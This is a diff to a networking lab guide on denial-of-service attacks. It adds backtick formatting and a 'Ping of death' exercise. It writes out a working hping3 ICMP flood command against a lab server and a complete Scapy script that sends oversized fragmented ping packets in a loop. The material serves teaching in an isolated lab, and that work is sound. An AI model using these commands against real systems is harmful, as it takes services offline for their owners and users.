@@ -57,16 +57,30 @@ To use our topology select, by double clicking, DoS_lab from the project library
 ### Ping Flood
 Ping flood is a volume based attack where we try to take the hole bandwidth for our self by spamming pings to the victim, this will render the server unreachable to any one else. To do so we will use the hping3 on the kali machine using the flag -1 for ICMP and --flood to spamm ping messages. To see the result of our attaks we will first start a ping from PC1 towards the victim with the command:
 
-ping 192.168.100.18 -t
+`ping 192.168.100.18 -t`
 
 the flag -t here is to continuosly ping the server; if it will ever go down we will see a timeout in the logs. To start the attack we open the shell on the kali machine and use the command:
 
-hping3 -1 --flood 192.168.100.18
+`hping3 -1 --flood 192.168.100.18`
 
 once we start the command we can see that the pings from PC1 won't be received from the victim this can also be seen if we click on the connection between the router and the server and open wireshark there. To end the attak just press Ctrl+c on the kali shell and you will see that the pings will be recived by the server once again.
 
 ### Ping of death
+Ping of death is a resource based attack with the goal to crash a server due to it allocating too little space for the recived package. As already mantion the maximun leangth of a ping is 65535 with 20 used by the header but in many older versions of OSs the allocated space is way less (e.g. one datagram which is 1500 bytes); this oversite was repeated even in IPv6. For our exercise open the terminal on kali-machine-1 and edit the unfinished version of ping_of_death.py with either vim or nano. One possible solution is:
 
+`from scapy.all import *
+target_ip = None # insert target ip
+ip = IP(dst=target_ip)
+icmp = ICMP()
+raw = Raw(b'X'*65500)
+packet = ip / icmp / raw
+send(fragment(packet), loop=1, verbose=0)`
+
+To check if the scrip is correct lounch it with the command
+
+`python ping_of_death.py`
+
+and see if the ping from the PC1 don't reach the victim
 
 ### Mitigations
 
